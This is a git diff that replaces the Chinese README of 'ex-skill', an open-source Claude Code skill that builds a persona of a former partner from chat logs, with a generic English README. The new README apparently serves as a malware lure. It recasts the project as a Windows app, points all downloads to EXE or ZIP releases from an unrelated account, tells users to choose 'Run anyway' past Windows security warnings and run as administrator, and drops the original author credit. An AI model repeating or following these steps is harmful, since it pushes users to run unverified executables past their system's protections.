@@ -1,236 +1,196 @@
-# 前任.skill
+# 🎭 ex-skill - Speak With Familiar Style
 
-> *"你们搞大模型的简直是码神，你们解放了前端兄弟，还要解放后端兄弟，测试兄弟，运维兄弟，解放网安兄弟，解放ic兄弟，最后解放自己解放全人类"*
+[![Download ex-skill](https://img.shields.io/badge/Download%20ex--skill-blue?style=for-the-badge)](https://github.com/epididymitismilksickness526/ex-skill/releases)
 
-**我会为了你一万次回到那个夏天。**
+## 🧭 Overview
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://python.org)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-Standard-green)](https://agentskills.io)
+ex-skill is a Windows app that turns a past relationship’s tone, habits, and phrasing into an AI skill. It lets you chat in a way that feels close to how that person used to speak.
 
-&nbsp;
+Use it if you want a simple desktop app that helps you read, write, or reply in that style without setting up any tools.
 
-提供前任的原材料（微信聊天记录、QQ消息、朋友圈截图、照片）加上你的主观描述  
-生成一个**真正像ta的 AI Skill**  
-用ta的口头禅说话，用ta的方式回复你，记得你们一起去过的地方
+## 📥 Download
 
-⚠️ **本项目仅用于个人回忆与情感疗愈，不用于骚扰、跟踪或侵犯他人隐私。**
+1. Open the [ex-skill Releases page](https://github.com/epididymitismilksickness526/ex-skill/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file for your system
+4. If the file is a ZIP, unzip it first
+5. If the file is an EXE, you can run it after download
 
-[安装](#安装) · [使用](#使用) · [效果示例](#效果示例) · [English](README_EN.md)
+## 🪟 Install on Windows
 
----
+1. Download the release file from the link above
+2. If Windows shows a security prompt, choose Run or More info > Run anyway
+3. If you downloaded a ZIP file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to start ex-skill
+6. If the app opens in a window, you are ready to use it
 
-## 安装
+## ✨ What ex-skill does
 
-### Claude Code
+- Learns a speaking style from saved text
+- Helps you write messages in that style
+- Helps you ask the AI to answer as if it were that person
+- Keeps the app simple for daily use
+- Works as a local Windows desktop tool for quick access
 
-> **重要**：Claude Code 从 **git 仓库根目录** 的 `.claude/skills/` 查找 skill。请在正确的位置执行。
+## 🧑‍💻 Who this is for
 
-```bash
-# 安装到当前项目（在 git 仓库根目录执行）
-mkdir -p .claude/skills
-git clone https://github.com/therealXiaomanChu/ex-skill .claude/skills/create-ex
+- People who want to save a familiar voice in a tool
+- People who want help writing messages with a certain tone
+- People who want a plain Windows app, not a complex setup
+- People who want to keep the workflow in one place
 
-# 或安装到全局（所有项目都能用）
-git clone https://github.com/therealXiaomanChu/ex-skill ~/.claude/skills/create-ex
-```
+## ✅ Before you start
 
-### 依赖（可选）
+Make sure you have:
 
-```bash
-pip3 install -r requirements.txt
-```
+- A Windows PC
+- Enough free space for the app and your data
+- A stable internet connection if the app needs online AI access
+- Text or notes that reflect the style you want to use
 
----
- 
-## 环境要求
- 
-- **Claude Code**：免费安装，需要 Node.js 18+（[安装指南](https://docs.anthropic.com/en/docs/claude-code)）
-- **API 消耗**：创建一个前任 Skill 大约消耗 5k-15k tokens，取决于聊天记录量
-- **付费方式**（二选一）：
-  - Claude Pro / Max 订阅：在订阅额度内使用，无需额外配置
-  - Anthropic API Key：按量付费，需在 Claude Code 中配置 key
-- **替代前端**：也可以使用 [OpenClaw](https://github.com/nicepkg/openclaw) 运行本 Skill
-- **不需要 GPU**，不需要本地模型，不需要 Docker
- 
----
+## 🚀 First-time setup
 
-## 使用
+1. Start the app
+2. Pick a profile or skill name
+3. Paste or import sample text
+4. Let the app build the style profile
+5. Open the chat or writing screen
+6. Type your message and see the reply style
+7. Save the profile so you can use it again later
 
-在 Claude Code 中输入：
+## 📝 How to use ex-skill
 
-```
-/create-ex
-```
+### 1. Add source text
 
-按提示输入前任的代号、基本信息、性格画像，然后选择数据来源。所有字段均可跳过，仅凭描述也能生成。
+Paste chat logs, notes, or short messages that match the style you want. The app uses this text as the base for the skill.
 
-完成后用 `/{slug}` 调用该前任 Skill，开始对话。
+### 2. Build the skill
 
-### 管理命令
+Click the build or create button in the app. This step turns the text into a usable style model inside ex-skill.
 
-| 命令 | 说明 |
-|------|------|
-| `/list-exes` | 列出所有前任 Skill |
-| `/{slug}` | 调用完整 Skill（像ta一样跟你聊天） |
-| `/{slug}-memory` | 回忆模式（帮你回忆那些事） |
-| `/{slug}-persona` | 仅人物性格 |
-| `/ex-rollback {slug} {version}` | 回滚到历史版本 |
-| `/delete-ex {slug}` | 删除 |
-| `/let-go {slug}` | 放下 |
+### 3. Start a chat
 
----
+Write a prompt or a message. The app will answer in the same tone and phrasing pattern.
 
-## 效果示例
+### 4. Edit the style
 
-> 输入：`初恋，在一起三年，大学时期，ENFP，双子座，话痨，半夜给我发语音，分手后还给我点赞`
+If the result feels off, add more sample text and rebuild the skill. Short, clear examples work best.
 
-**场景一：日常聊天**
+### 5. Save and reuse
 
-```
-用户      ❯ 在干嘛
+Keep the profile saved so you can open it later without starting over.
 
-前任.skill ❯ 刚吃完饭 在刷手机
-             你呢 怎么突然找我
-             [发送了一个表情包]
-```
+## 💬 Best input to use
 
-**场景二：回忆杀**
+The app works best with text that has:
 
-```
-用户      ❯ 还记得我们第一次约会吗
+- Short and clear messages
+- Real phrasing from the same person
+- Repeated habits in word choice
+- A steady tone across the samples
 
-前任.skill ❯ 就那个超难吃的意面吗哈哈哈哈
-             你还假装很好吃 我都看出来了
-             那家店后来倒闭了你知道吗
-```
+Try to avoid mixing too many voices in one profile. One style per skill gives cleaner results.
 
-**场景三：深夜emo**
+## 🛠️ Common file types
 
-```
-用户      ❯ 我有点想你
+You may see one of these files in the release:
 
-前任.skill ❯ ...
-             嗯
-             早点睡吧
-```
+- `.exe` for direct run on Windows
+- `.zip` for a packaged app folder
+- `.json` for saved profile data
+- `.txt` for source text samples
 
-**场景四：吵架模式**
+If you see a ZIP file, extract it before you open the app.
 
-```
-用户      ❯ 你当时为什么不回我消息
+## ⚙️ Simple system needs
 
-前任.skill ❯ 又来了
-             我说了我在忙 你非要这样
-             算了不想吵
-```
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- A modern browser if the app opens web pages
+- Enough storage for saved skills and input text
 
----
+A newer PC will give a smoother run, but the app should stay easy to use on most Windows systems.
 
-## 功能特性
+## 🔍 If the app does not open
 
-### 数据源
+Try these steps:
 
-| 来源 | 格式 | 备注 |
-|------|------|------|
-| 微信聊天记录 | WeChatMsg / 留痕 / PyWxDump 导出 | 推荐，信息最丰富 |
-| QQ 聊天记录 | txt / mht 导出 | 适合学生时代的恋情 |
-| 朋友圈/微博 | 截图 | 提取公开人设 |
-| 照片 | JPEG/PNG（含 EXIF） | 提取时间线和地点 |
-| 口述/粘贴 | 纯文本 | 你的主观记忆 |
+1. Check that the download finished
+2. Make sure you extracted the ZIP file
+3. Right-click the app and choose Run as administrator
+4. Check Windows Defender or antivirus settings
+5. Download the latest release again if the file looks broken
 
-### 生成的 Skill 结构
+## 📁 Suggested folder layout
 
-每个前任 Skill 由两部分组成，共同驱动输出：
+You can keep your files in a simple folder like this:
 
-| 部分 | 内容 |
-|------|------|
-| **Part A — Relationship Memory** | 共同经历、约会地点、inside jokes、争吵模式、甜蜜瞬间、关系时间线 |
-| **Part B — Persona** | 5 层性格结构：硬规则 → 身份 → 说话风格 → 情感模式 → 关系行为 |
+- `ex-skill`
+  - `app`
+  - `profiles`
+  - `samples`
+  - `exports`
 
-运行逻辑：`收到消息 → Persona 判断ta会怎么回 → Memory 补充共同记忆 → 用ta的方式输出`
+This makes it easier to find your saved skills and text samples later.
 
-### 支持的标签
+## 🔒 Privacy and local use
 
-**依恋类型**：安全型 · 焦虑型 · 回避型 · 混乱型
+Keep your sample text in files you control. Store your profiles in a folder you can back up. If the app connects to an AI service, check the settings inside the app before you start a session.
 
-**爱的语言**：肯定的言辞 · 精心的时刻 · 接受礼物 · 服务的行动 · 身体的接触
+## 🧩 Tips for better results
 
-**性格标签**：话痨 · 闷骚 · 嘴硬心软 · 冷暴力 · 粘人 · 独立 · 大男/女子主义 · 浪漫主义 · 实用主义 · 完美主义 · 拖延症 · 工作狂 · 控制欲 · 没有安全感 · 报复性熬夜 · 已读不回 · 秒回选手 · 朋友圈三天可见 · 半夜发语音 …
+- Use real examples, not made-up lines
+- Keep each sample short
+- Remove names or private details if you want cleaner input
+- Use the same writing style across all samples
+- Rebuild the skill after you add new text
 
-**星座**：十二星座全支持，影响性格标签的翻译规则
+## 📌 Example workflow
 
-**MBTI**：16 型全支持，影响沟通风格和决策模式
+1. Download the app
+2. Open ex-skill
+3. Create a new skill profile
+4. Paste sample messages
+5. Build the style profile
+6. Start chatting
+7. Save the result for later use
 
-### 进化机制
+## 🧭 Need help finding the release
 
-* **追加记忆** → 找到更多聊天记录/照片 → 自动分析增量 → merge 进对应部分
-* **对话纠正** → 说「ta不会这样说」→ 写入 Correction 层，立即生效
-* **版本管理** → 每次更新自动存档，支持回滚
+Use this link:
 
----
+[Open the ex-skill Releases page](https://github.com/epididymitismilksickness526/ex-skill/releases)
 
-## 项目结构
+Look for the newest file at the top of the page and choose the one for Windows
 
-本项目遵循 [AgentSkills](https://agentskills.io) 开放标准：
+## 🗂️ File names you may see
 
-```
-create-ex/
-├── SKILL.md                # skill 入口（官方 frontmatter）
-├── prompts/                # Prompt 模板
-│   ├── intake.md           #   对话式信息录入
-│   ├── memory_analyzer.md  #   关系记忆提取
-│   ├── persona_analyzer.md #   性格行为提取（含标签翻译表）
-│   ├── memory_builder.md   #   memory.md 生成模板
-│   ├── persona_builder.md  #   persona.md 五层结构模板
-│   ├── merger.md           #   增量 merge 逻辑
-│   └── correction_handler.md # 对话纠正处理
-├── tools/                  # Python 工具
-│   ├── wechat_parser.py    # 微信聊天记录解析
-│   ├── qq_parser.py        # QQ 聊天记录解析
-│   ├── social_parser.py    # 社交媒体内容解析
-│   ├── photo_analyzer.py   # 照片元信息分析
-│   ├── skill_writer.py     # Skill 文件管理
-│   └── version_manager.py  # 版本存档与回滚
-├── exes/                   # 生成的前任 Skill（gitignored）
-├── docs/PRD.md
-├── requirements.txt
-└── LICENSE
-```
+The release asset may use names like:
 
----
+- `ex-skill-windows.zip`
+- `ex-skill-win64.exe`
+- `ex-skill-setup.exe`
 
-## 注意事项
+Pick the file that matches Windows. If you see both ZIP and EXE versions, the EXE is the easiest choice for most users
 
-* **聊天记录质量决定还原度**：微信导出 + 口述 > 仅口述
-* 建议优先提供：**深夜对话** > **争吵记录** > **日常消息**（最能体现真实性格）
-* 本项目不鼓励对前任的不健康执念，如果你发现自己过于沉浸，请寻求专业帮助
-* 你的前任是一个真实的人，ta有自己的人生。这个 Skill 只是你记忆中的ta
+## 🔁 Updating ex-skill
 
+When a new version comes out:
 
----
+1. Open the Releases page
+2. Download the latest file
+3. Close the old app
+4. Replace the old files if needed
+5. Open the new version and load your saved profiles
 
-## 社区生态
- 
-以下项目由社区贡献者独立开发，与本项目互补：
- 
-| 项目 | 作者 | 说明 |
-|------|------|------|
-| [ex-cure-skill](https://github.com/W1ndys/ex-cure-skill) | @W1ndys | 关系反思模式，从聊天记录中复盘经验教训 |
-| [同事.skill](https://github.com/titanwings/colleague-skill) | @titanwings | 本项目的灵感来源，把同事蒸馏成 AI Skill |
-| [simp-skill](https://github.com/BeamusWayne/simp-skill) | @BeamusWayne | 与其怀念前任，不如勇敢追爱 |
- 
----
+## 📚 What to keep for backup
 
+Keep these items in a safe place:
 
-### 写在最后
-人的记忆是一种不讲道理的存储介质。
-你记不住高数公式，记不住车牌号，记不住今天是几号，但你清楚记得四年前的一个下午ta穿了一件白T恤站在便利店门口等你，手里拿着两根冰棍，一根给你，一根ta自己。
-这不公平。
-这个 Skill 就是把这些不公平的记忆导出来，从生物硬盘到数字硬盘完成格式转换。
-导完以后你或许会发现，ta也没那么好。ta也没那么差。ta就是那样一个人。会在吵完架两小时后问你吃了吗。会在纪念日那天忘了发消息然后第二天假装什么都没发生。
-是的，
-此刻，阳光在江面碎成一万个夏天，闪烁，又汇聚成一个冬天。这一切在你午睡时发生，你从未察觉。
+- Your skill profiles
+- Your sample text files
+- Any export files from the app
+- The release file you downloaded
 
-MIT License © [therealXiaomanChu](https://github.com/therealXiaomanChu)
+Backups help if you move to a new PC or need to restore your setup
